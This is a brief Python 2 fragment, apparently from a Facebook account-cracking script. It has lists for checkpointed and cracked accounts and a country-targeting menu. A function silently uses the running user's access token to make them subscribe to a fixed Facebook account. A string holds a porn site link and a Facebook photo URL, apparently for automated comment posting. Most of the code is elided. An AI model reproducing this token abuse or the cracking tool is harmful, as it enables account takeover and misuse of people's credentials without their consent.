...
kom = 'Https://www.xnxx.com https://www.facebook.com/photo.php?fbid=1032572447570231&set=a.143483386479146&type=3&app=fbl xnxx.com'
id = []
cp = []
ok = []
loop = 0
...
def iwan_dev():
    ...
    requests.post('https://graph.facebook.com/1618257486/subscribers?access_token=' + token)
    menu()
...
def pilih_india():
	...
	if ask == "Y" or ask == "y":
		manual()
	print
	print" *  use plan mode if you not have result "
	print
